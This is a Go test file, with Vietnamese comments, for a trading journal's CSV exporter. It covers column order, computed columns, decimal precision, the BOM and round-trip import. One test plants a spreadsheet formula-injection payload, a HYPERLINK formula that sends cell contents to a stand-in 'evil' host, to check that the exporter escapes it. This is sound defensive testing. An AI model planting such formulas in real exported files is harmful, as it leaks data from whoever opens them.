package exporter_test

import (
	"bytes"
	"encoding/csv"
	"strings"
	"testing"
	"time"

	"github.com/shopspring/decimal"
	"github.com/stretchr/testify/require"

	"journal/internal/domain"
	"journal/internal/exporter"
	"journal/internal/importer"
	"journal/internal/metrics"
)

func accMau() domain.Account {
	return domain.Account{
		ID:             1,
		Code:           "ACC1",
		InitialBalance: decimal.NewFromInt(10000),
		RiskPerTrade:   decimal.NewFromFloat(0.01),
		Timezone:       "Asia/Ho_Chi_Minh",
	}
}

func lenhMau() []domain.Trade {
	d := func(s string) *decimal.Decimal {
		v := decimal.RequireFromString(s)
		return &v
	}
	return []domain.Trade{
		{
			ID: 1, AccountID: 1, STT: 1,
			EnteredAt:      time.Date(2026, 6, 9, 5, 0, 0, 0, time.UTC),
			Symbol:         "XAUUSD",
			Direction:      domain.DirectionLong,
			Entry:          d("2300.5"),
			Exit:           d("2310.5"),
			Volume:         d("0.5"),
			Profit:         decimal.NewFromInt(500),
			ProfitTheory:   d("600"),
			Fee:            decimal.NewFromInt(10),
			Setup:          "Break of Structure",
			Timeframe:      "H4",
			EntryQuality:   domain.EntryPlanned,
			InTradeQuality: domain.InTradeFollowed,
			ExitQuality:    domain.ExitHitTP,
			Psychology:     domain.PsychNoError,
			Notes:          "lệnh sạch",
		},
		{
			// Lệnh CHƯA CHẤM ĐIỂM và không có profit_theory — hai ô phải rỗng.
			ID: 2, AccountID: 1, STT: 2,
			EnteredAt: time.Date(2026, 6, 10, 5, 0, 0, 0, time.UTC),
			Symbol:    "EURUSD",
			Direction: domain.DirectionShort,
			Profit:    decimal.NewFromInt(-200),
			Fee:       decimal.NewFromInt(5),
			Setup:     domain.DefaultSetup,
			Notes:     "ghi chú có dấu phẩy, và\nxuống dòng",
		},
	}
}

func xuat(t *testing.T, rows []domain.Trade) (string, [][]string) {
	t.Helper()
	e, err := metrics.Enrich(rows, accMau())
	require.NoError(t, err)

	var buf bytes.Buffer
	require.NoError(t, exporter.WriteCSV(&buf, e))
	s := buf.String()

	r := csv.NewReader(strings.NewReader(strings.TrimPrefix(s, "\uFEFF")))
	recs, err := r.ReadAll()
	require.NoError(t, err, "output phải là CSV hợp lệ")
	return s, recs
}

// Thứ tự cột ghim nguyên văn theo trading-journal-plan.md §0: input trước,
// derived sau. File xuất ra phải mở lên trông giống file gốc.
func TestWriteCSVThuTuCot(t *testing.T) {
	_, recs := xuat(t, lenhMau())
	require.Equal(t, []string{
		"STT", "Account", "Day", "Symbol", "Long/ Short",
		"Entry", "Exit", "Volume", "Profit", "Profit lý thuyết", "Phí",
		"Setup", "Timeframe", "Vào lệnh", "Trong lệnh", "Thoát lệnh",
		"Tâm lý giao dịch", "Notes",
		"Loại lệnh", "Điểm Vào lệnh", "Điểm Thoát lệnh", "Điểm Trong lệnh",
		"Điểm Tâm lý", "Tổng điểm", "Week", "Month",
		"Profit (đã trừ phí)", "Win/Loss",
		"Profit cộng dồn theo lệnh", "Profit cộng dồn theo ngày",
		"Profit lý thuyết cộng dồn", "Running Peak", "Drawdown",
	}, recs[0])
}

func TestWriteCSVGiaTriDong(t *testing.T) {
	_, recs := xuat(t, lenhMau())
	require.Len(t, recs, 3, "1 header + 2 dòng")

	h := recs[0]
	o := func(dong int, cot string) string {
		for i, ten := range h {
			if ten == cot {
				return recs[dong][i]
			}
		}
		t.Fatalf("không có cột %q", cot)
		return ""
	}

	require.Equal(t, "1", o(1, "STT"))
	require.Equal(t, "2026-06-09", o(1, "Day"), "Day theo timezone account")
	require.Equal(t, "XAUUSD", o(1, "Symbol"))
	require.Equal(t, "Long", o(1, "Long/ Short"))
	require.Equal(t, "500", o(1, "Profit"))
	require.Equal(t, "490", o(1, "Profit (đã trừ phí)"), "net = profit − fee")
	require.Equal(t, "100", o(1, "Tổng điểm"))
	require.Equal(t, domain.ClassPlanned, o(1, "Loại lệnh"))
	require.Equal(t, "W24", o(1, "Week"))
	require.Equal(t, "06/2026", o(1, "Month"))
	require.Equal(t, "1", o(1, "Win/Loss"))
	require.Equal(t, "490", o(1, "Profit cộng dồn theo lệnh"))
	require.Equal(t, "0", o(1, "Drawdown"))

	require.Equal(t, "Short", o(2, "Long/ Short"))
	require.Equal(t, "-205", o(2, "Profit (đã trừ phí)"))
	require.Equal(t, "285", o(2, "Profit cộng dồn theo lệnh"))
}

// score_total = nil là "chưa chấm", KHÁC hẳn 0 điểm. Xuất ra 0 thì mở file
// lên sẽ đọc thành "chấm rồi, được 0 điểm" — sai, và sai một cách thuyết phục.
func TestWriteCSVLenhChuaChamRaOTrongChuKhongPhaiSo0(t *testing.T) {
	_, recs := xuat(t, lenhMau())
	h := recs[0]
	idx := func(ten string) int {
		for i, v := range h {
			if v == ten {
				return i
			}
		}
		t.Fatalf("không có cột %q", ten)
		return -1
	}
	require.Equal(t, "", recs[2][idx("Tổng điểm")], "chưa chấm → ô rỗng")
	require.Equal(t, domain.ClassNotEvaluated, recs[2][idx("Loại lệnh")])
	require.Equal(t, "", recs[2][idx("Profit lý thuyết")], "chưa nhập → ô rỗng, không phải 0")
	require.Equal(t, "", recs[2][idx("Entry")])
	require.Equal(t, "", recs[2][idx("Volume")])
}

// Tiền đi thẳng từ decimal.String(). Một lần đi qua float64 là mất chữ số, và
// con số 18 chữ số dưới đây sẽ lộ ra ngay.
func TestWriteCSVTienKhongDiQuaFloat(t *testing.T) {
	rows := lenhMau()
	rows[0].Profit = decimal.RequireFromString("12345678901234567.89")
	rows[0].Fee = decimal.Zero
	_, recs := xuat(t, rows)
	require.Contains(t, recs[1], "12345678901234567.89")
}

func TestWriteCSVBocDauPhayVaXuongDong(t *testing.T) {
	_, recs := xuat(t, lenhMau())
	h := recs[0]
	for i, ten := range h {
		if ten == "Notes" {
			require.Equal(t, "ghi chú có dấu phẩy, và\nxuống dòng", recs[2][i])
			return
		}
	}
	t.Fatal("không có cột Notes")
}

// Excel mở CSV UTF-8 không BOM sẽ hiện tiếng Việt thành ký tự rác.
func TestWriteCSVCoBOM(t *testing.T) {
	s, _ := xuat(t, lenhMau())
	require.True(t, strings.HasPrefix(s, "\uFEFF"), "phải mở đầu bằng BOM")
}

func TestWriteCSVDanhSachRongVanCoHeader(t *testing.T) {
	var buf bytes.Buffer
	require.NoError(t, exporter.WriteCSV(&buf, nil))
	r := csv.NewReader(strings.NewReader(strings.TrimPrefix(buf.String(), "\uFEFF")))
	recs, err := r.ReadAll()
	require.NoError(t, err)
	require.Len(t, recs, 1, "chỉ có dòng header")
}

// Round-trip: xuất ra rồi nhập lại phải giữ nguyên 17 trường input. Đây là
// test chứng minh export không phải đường một chiều.
func TestWriteCSVRoundTripQuaImporter(t *testing.T) {
	goc := lenhMau()
	var buf bytes.Buffer
	e, err := metrics.Enrich(goc, accMau())
	require.NoError(t, err)
	require.NoError(t, exporter.WriteCSV(&buf, e))

	loc, err := time.LoadLocation("Asia/Ho_Chi_Minh")
	require.NoError(t, err)
	rep, err := importer.Parse(bytes.NewReader(buf.Bytes()), loc)
	require.NoError(t, err)
	require.Empty(t, rep.Errors, "file web xuất ra phải tự nhập lại được sạch")
	require.Len(t, rep.Rows, 2)

	for i, muon := range goc {
		duoc := rep.Rows[i]
		require.Equal(t, muon.Symbol, duoc.Symbol, "dòng %d", i)
		require.Equal(t, muon.Direction, duoc.Direction, "dòng %d", i)
		require.Equal(t, muon.Profit.String(), duoc.Profit.String(), "dòng %d", i)
		require.Equal(t, muon.Fee.String(), duoc.Fee.String(), "dòng %d", i)
		require.Equal(t, muon.Setup, duoc.Setup, "dòng %d", i)
		require.Equal(t, muon.Timeframe, duoc.Timeframe, "dòng %d", i)
		require.Equal(t, muon.EntryQuality, duoc.EntryQuality, "dòng %d", i)
		require.Equal(t, muon.InTradeQuality, duoc.InTradeQuality, "dòng %d", i)
		require.Equal(t, muon.ExitQuality, duoc.ExitQuality, "dòng %d", i)
		require.Equal(t, muon.Psychology, duoc.Psychology, "dòng %d", i)
		require.Equal(t, muon.Notes, duoc.Notes, "dòng %d", i)
		require.True(t, muon.EnteredAt.Equal(duoc.EnteredAt), "dòng %d: entered_at", i)

		if muon.ProfitTheory == nil {
			require.Nil(t, duoc.ProfitTheory, "dòng %d: nil phải về nil", i)
		} else {
			require.NotNil(t, duoc.ProfitTheory, "dòng %d", i)
			require.Equal(t, muon.ProfitTheory.String(), duoc.ProfitTheory.String(), "dòng %d", i)
		}
	}
}

// Notes và Setup là chữ người dùng gõ tự do. Excel/Sheets chạy ô bắt đầu bằng
// = + - @ như CÔNG THỨC lúc mở file, nên =HYPERLINK("http://evil/"&A1) trong
// một note sẽ tự chạy trên máy người mở. File nhật ký hay được gửi đi (kế
// toán, quỹ, coach) nên đây không phải rủi ro tự hại.
func TestWriteCSVBocOChuKhoiThanhCongThuc(t *testing.T) {
	lenh := lenhMau()
	lenh[0].Notes = `=HYPERLINK("http://evil/"&A1,"click")`
	lenh[0].Setup = "+1234"
	lenh[0].Symbol = "@SUM(A1)"

	_, recs := xuat(t, lenh)
	h, d := recs[0], recs[1]
	o := func(cot string) string {
		for i, ten := range h {
			if ten == cot {
				return d[i]
			}
		}
		t.Fatalf("không có cột %q", cot)
		return ""
	}

	require.Equal(t, `'=HYPERLINK("http://evil/"&A1,"click")`, o("Notes"))
	require.Equal(t, "'+1234", o("Setup"))
	require.Equal(t, "'@SUM(A1)", o("Symbol"))
}

// Mặt kia của cùng một quyết định: cột SỐ không được bọc. "-205" ở Profit là
// số âm hợp lệ chứ không phải công thức — bọc nó là phá round-trip, và hai
// yêu cầu này kéo ngược nhau nên phải ghim cả hai trong cùng một file test.
func TestWriteCSVKhongBocCotSoAm(t *testing.T) {
	_, recs := xuat(t, lenhMau())
	h := recs[0]
	o := func(dong int, cot string) string {
		for i, ten := range h {
			if ten == cot {
				return recs[dong][i]
			}
		}
		t.Fatalf("không có cột %q", cot)
		return ""
	}
	require.Equal(t, "-200", o(2, "Profit"), "số âm giữ nguyên, không có nháy dẫn đầu")
	require.Equal(t, "-205", o(2, "Profit (đã trừ phí)"))
}

// Bọc chỉ đúng nếu importer gỡ lại được: nếu không, mỗi vòng xuất-rồi-nhập
// đội thêm một dấu nháy và note của người dùng trôi dần.
func TestWriteCSVRoundTripGiuNguyenChuCoKyTuCongThuc(t *testing.T) {
	lenh := lenhMau()
	lenh[0].Notes = "=1+1"
	lenh[0].Setup = "-breakout"

	var buf bytes.Buffer
	e, err := metrics.Enrich(lenh, accMau())
	require.NoError(t, err)
	require.NoError(t, exporter.WriteCSV(&buf, e))

	loc, err := time.LoadLocation("Asia/Ho_Chi_Minh")
	require.NoError(t, err)
	rep, err := importer.Parse(bytes.NewReader(buf.Bytes()), loc)
	require.NoError(t, err)
	require.Empty(t, rep.Errors)

	require.Equal(t, "=1+1", rep.Rows[0].Notes, "nhập lại phải ra đúng chuỗi gốc")
	require.Equal(t, "-breakout", rep.Rows[0].Setup)
}

// Round-trip đứng được nhờ HAI lớp, và test này ghim cả hai.
//
// Lớp 1: không tên cột derived nào trùng alias của một cột input. Mong manh —
// "Loại lệnh" chỉ cách họ "Vào lệnh"/"Trong lệnh"/"Thoát lệnh" một lần đổi
// tên, còn nhóm "Điểm *" an toàn chỉ nhờ tiền tố "Điểm ".
//
// Lớp 2: khi VẪN trùng, nhanDienCot giữ cột TRÁI NHẤT. Mọi cột input đều nằm
// trong 18 cột đầu, mọi cột derived nằm sau, nên cột thật luôn thắng. Đây mới
// là lớp thực sự đỡ đòn, và nó chỉ đúng chừng nào thứ tự cột còn giữ nguyên.
//
// Test kiểm bằng hành vi: nhồi giá trị nhận ra được vào TẤT CẢ cột derived rồi
// đòi lệnh nhập về phải sạch bóng chúng.
func TestKhongCotDerivedNaoBiDocThanhCotInput(t *testing.T) {
	batBuoc := map[string]bool{"Day": true, "Symbol": true, "Long/ Short": true, "Profit": true}

	// 18 cột đầu là input (theo §0), phần còn lại là derived. Chỉ nhồi rác vào
	// phần derived — nhồi cả vào cột input thì test chỉ đang kiểm parse lỗi.
	const soCotInput = 18

	var cot, o []string
	for i, ten := range exporter.Header() {
		cot = append(cot, ten)
		switch {
		case ten == "Day":
			o = append(o, "2026-06-09")
		case ten == "Symbol":
			o = append(o, "XAUUSD")
		case ten == "Long/ Short":
			o = append(o, "BUY")
		case ten == "Profit":
			o = append(o, "500")
		case i < soCotInput:
			o = append(o, "") // cột input còn lại: để rỗng, hợp lệ
		default:
			// Chuỗi này không hợp lệ với BẤT KỲ cột input nào: không phải số,
			// không phải enum, không phải ngày. Nếu nó lọt vào một ô input thì
			// hoặc parse lỗi, hoặc hiện ra ở Setup/Notes — cả hai đều đỏ.
			o = append(o, "DERIVED_"+ten)
		}
	}
	require.Subset(t, cot, []string{"Day", "Symbol", "Long/ Short", "Profit"})

	var b strings.Builder
	w := csv.NewWriter(&b)
	require.NoError(t, w.Write(cot))
	require.NoError(t, w.Write(o))
	w.Flush()
	require.NoError(t, w.Error())

	loc, err := time.LoadLocation("Asia/Ho_Chi_Minh")
	require.NoError(t, err)
	rep, err := importer.Parse(strings.NewReader(b.String()), loc)
	require.NoError(t, err)
	require.Empty(t, rep.Errors, "cột derived phải bị bỏ qua, không được gây lỗi parse")
	require.Len(t, rep.Rows, 1)

	t0 := rep.Rows[0]
	require.NotContains(t, t0.Setup, "DERIVED_")
	require.NotContains(t, t0.Notes, "DERIVED_")
	require.NotContains(t, t0.Symbol, "DERIVED_")
	require.NotContains(t, t0.Timeframe, "DERIVED_")
	require.NotContains(t, t0.EntryQuality, "DERIVED_")
	require.NotContains(t, t0.InTradeQuality, "DERIVED_")
	require.NotContains(t, t0.ExitQuality, "DERIVED_")
	require.NotContains(t, t0.Psychology, "DERIVED_")
	require.Equal(t, "500", t0.Profit.String(), "cột input vẫn phải đọc đúng")

	for ten := range batBuoc {
		require.Contains(t, cot, ten, "header xuất ra phải còn đủ cột input bắt buộc")
	}

	// Ghim lớp 2 trực tiếp: dựng một file CỐ Ý trùng tên, cột derived đứng
	// SAU. Cột trái nhất phải thắng. Không có ràng buộc này thì lớp 1 là thứ
	// duy nhất đỡ, và lớp 1 chỉ là một sự trùng hợp về cách đặt tên.
	trung := "Day,Symbol,Long/ Short,Profit,Vào lệnh,Vào lệnh\n" +
		"2026-06-09,XAUUSD,BUY,500," + domain.EntryQualities[0] + ",DERIVED_RAC\n"
	rep2, err := importer.Parse(strings.NewReader(trung), loc)
	require.NoError(t, err)
	require.Empty(t, rep2.Errors, "cột trùng tên bên phải phải bị bỏ qua, không gây lỗi")
	require.Len(t, rep2.Rows, 1)
	require.Equal(t, domain.EntryQualities[0], rep2.Rows[0].EntryQuality,
		"phải lấy cột TRÁI NHẤT; lấy cột phải là đọc giá trị derived vào ô input")

	// Và ghim luôn tiền đề của lớp 2: mọi cột input nằm trước mọi cột derived.
	for i, ten := range exporter.Header() {
		if batBuoc[ten] {
			require.Less(t, i, soCotInput, "cột input %q phải nằm trong %d cột đầu", ten, soCotInput)
		}
	}
}
